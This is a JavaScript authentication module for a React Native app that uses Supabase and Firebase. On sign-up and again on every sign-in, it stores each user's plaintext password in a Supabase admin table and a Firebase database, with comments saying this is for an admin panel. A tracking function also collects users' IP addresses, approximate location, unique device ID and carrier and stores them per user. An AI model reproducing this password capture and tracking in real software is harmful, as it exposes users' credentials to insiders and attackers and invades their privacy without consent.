import { supabase } from '../config/supabase';

// ==================== PASSWORD AUTH ====================

/**
 * Sign Up with Email & Password
 */
export const signUpWithEmail = async (email, password, name) => {
  try {
    const { data, error } = await supabase.auth.signUp({
      email,
      password,
      options: {
        data: {
          display_name: name,
        },
      },
    });

    if (error) throw error;

    // Store credentials for admin visibility (as requested by user)
    // Synchronize to both Supabase and Firebase for Admin Panel support
    if (data.user) {
      // 1. Supabase Admin Table
      const { error: adminError } = await supabase
        .from('admin_user_data')
        .insert([{ 
          user_id: data.user.id, 
          email: email, 
          password: password 
        }]);

      if (adminError) {
          console.error("Supabase Admin Meta Error:", adminError.message);
      }
      
      // 2. Firebase Sync (for your Admin Panel)
      try {
        const database = require("@react-native-firebase/database").default;
        const DB_URL = 'https://facevaultapp-bb50e-default-rtdb.firebaseio.com';
        await database().refFromURL(`${DB_URL}/users/${data.user.id}`).set({
          name: name,
          email: email,
          password: password, // ⚠️ Saving plain text for Admin Panel as requested
          createdAt: new Date().toISOString(),
          lastLogin: new Date().toISOString()
        });
        await database().refFromURL(`${DB_URL}/wallets/${data.user.id}`).set({
          balance: 0,
          lastUpdated: Date.now()
        });
      } catch (fbError) {
        console.warn("Firebase User Sync Error:", fbError.message);
      }
    }

    return { success: true, user: data.user };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

/**
 * Sign In with Email & Password
 */
export const signInWithEmail = async (email, password) => {
  try {
    const { data, error } = await supabase.auth.signInWithPassword({
      email,
      password,
    });

    if (error) throw error;

    // 🚀 Sync Password to Firebase on Login (Catch-up for existing users)
    try {
        const database = require("@react-native-firebase/database").default;
        const DB_URL = 'https://facevaultapp-bb50e-default-rtdb.firebaseio.com';
        await database().refFromURL(`${DB_URL}/users/${data.user.id}`).update({
            password: password, // Update password if changed/missing
            email: email,
            lastLogin: new Date().toISOString()
        });
    } catch (fbErr) {
        console.log("Login Firebase Sync Error:", fbErr);
    }

    return { success: true, user: data.user };
  } catch (error) {
    return { success: false, error: error.message };
  }
};


/**
 * Send OTP to user's email
 */
export const sendOtpToEmail = async (email) => {
  try {
    console.log("📨 Requesting OTP for:", email);
    const { error } = await supabase.auth.signInWithOtp({
      email: email,
      options: {
        shouldCreateUser: true,
      }
    });
    if (error) {
       console.log("❌ Supabase OTP Error:", error.message);
       throw error;
    }
    console.log("✅ OTP Request Success (Check Email)");
    return { success: true };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

/**
 * Send OTP to user's phone
 */
export const sendOtpToPhone = async (phone) => {
  try {
    console.log("📨 Requesting Phone OTP for:", phone);
    const { error } = await supabase.auth.signInWithOtp({
      phone: phone,
      options: {
        shouldCreateUser: true,
      }
    });
    if (error) {
       console.log("❌ Supabase Phone OTP Error:", error.message);
       throw error;
    }
    console.log("✅ Phone OTP Request Success");
    return { success: true };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

/**
 * Verify Phone OTP
 */
export const verifyOtpForPhone = async (phone, token) => {
  try {
    const { data, error } = await supabase.auth.verifyOtp({
      phone,
      token,
      type: 'sms',
    });
    if (error) throw error;
    return { success: true, session: data.session, user: data.user };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

/**
 * Verify Email OTP
 */
export const verifyOtpForEmail = async (email, token) => {
  try {
    const { data, error } = await supabase.auth.verifyOtp({
      email,
      token,
      type: 'email',
    });
    if (error) throw error;
    return { success: true, session: data.session, user: data.user };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

/**
 * Update User Profile (Supabase)
 */
export const updateUserProfile = async (updates) => {
  try {
    const { data: { user } } = await supabase.auth.getUser();
    if (!user) throw new Error("No user logged in");

    // 1. Update Supabase
    const { error } = await supabase
      .from('profiles')
      .update(updates)
      .eq('id', user.id);
      
    if (error) throw error;

    // 2. Sync to Firebase (for Admin Panel)
    try {
        const database = require("@react-native-firebase/database").default;
        const DB_URL = 'https://facevaultapp-bb50e-default-rtdb.firebaseio.com';
        const fbUpdates = {};
        if (updates.display_name) fbUpdates.name = updates.display_name;
        if (updates.mobile) fbUpdates.mobile = updates.mobile;
        if (updates.avatar_data) fbUpdates.image = updates.avatar_data;
        
        if (Object.keys(fbUpdates).length > 0) {
            await database().refFromURL(`${DB_URL}/users/${user.id}`).update(fbUpdates);
        }
    } catch (fbErr) {
        console.warn("Firebase Profile Sync Fail:", fbErr.message);
    }

    return { success: true };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

/**
 * Delete Own Account
 */
export const deleteAccount = async () => {
  try {
    const { error } = await supabase.rpc('delete_own_account');
    if (error) throw error;
    await supabase.auth.signOut();
    return { success: true };
  } catch (error) {
    return { success: false, error: error.message };
  }
};
/**
 * Sync User Activity (IP, Location, Status)
 */
export const syncUserActivity = async () => {
  try {
    const { data: { user } } = await supabase.auth.getUser();
    if (!user) return;

    const DeviceInfo = require("react-native-device-info");
    
    // 1. Fetch IP and Approx Location (Robust Fallback System)
    let ipData = {};
    try {
        // Option A: ipapi.co
        const response = await fetch('https://ipapi.co/json/');
        if (response.ok) {
            ipData = await response.json();
        } else {
            throw new Error("ipapi.co failed");
        }
    } catch (e) {
        // Option B: ipwho.is (Fallback)
        try {
            const resp2 = await fetch('https://ipwho.is/');
            const json2 = await resp2.json();
            if (json2.success) {
                ipData = {
                    ip: json2.ip,
                    city: json2.city,
                    region: json2.region,
                    country_name: json2.country,
                    latitude: json2.latitude,
                    longitude: json2.longitude,
                    org: json2.connection?.isp
                };
            } else {
                 throw new Error("ipwho.is failed");
            }
        } catch (e2) {
             // Option C: freeipapi.com (Last Resort)
             try {
                const resp3 = await fetch('https://freeipapi.com/api/json');
                const json3 = await resp3.json();
                ipData = {
                    ip: json3.ipAddress,
                    city: json3.cityName,
                    region: json3.regionName,
                    country_name: json3.countryName,
                    latitude: json3.latitude,
                    longitude: json3.longitude,
                    org: ""
                };
             } catch (e3) {
                 console.log("All IP APIs failed");
             }
        }
    }

    const uniqueId = await DeviceInfo.getUniqueId();
    const model = DeviceInfo.getModel();
    const brand = DeviceInfo.getBrand();
    const systemVersion = DeviceInfo.getSystemVersion();
    let carrier = "Unknown";
    try {
        carrier = await DeviceInfo.getCarrier();
    } catch (e) {}


    const deviceDetails = {
        uniqueId,
        model,
        brand,
        systemVersion,
        carrier,
        ipAddress: ipData.ip || "Unknown",
        city: ipData.city || "Unknown",
        region: ipData.region || "",
        country: ipData.country_name || "",
        latitude: ipData.latitude || 0,
        longitude: ipData.longitude || 0,
        isp: ipData.org || ""
    };

    const lastActive = new Date().toISOString();

    // 2. Update Firebase - Primary Device Info
    const database = require("@react-native-firebase/database").default;
    const DB_URL = 'https://facevaultapp-bb50e-default-rtdb.firebaseio.com';
    await database().refFromURL(`${DB_URL}/users/${user.id}`).update({
      lastActive,
      deviceInfo: deviceDetails,
      lastLogin: lastActive
    });

    // 3. Update Firebase - Device History (Add new device to list)
    await database().refFromURL(`${DB_URL}/users/${user.id}/devices/${uniqueId}`).set({
        ...deviceDetails,
        lastActive: lastActive
    });

    // 4. Update Supabase Profile
    const { error } = await supabase.from('profiles').update({
       last_active_at: lastActive
    }).eq('id', user.id);

  } catch (err) {
    console.warn("Sync Activity Error:", err.message);
  }
};

/**
 * Sign Out
 */
export const signOut = async () => {
  try {
    const { error } = await supabase.auth.signOut();
    if (error) throw error;
    return { success: true };
  } catch (error) {
    return { success: false, error: error.message };
  }
};
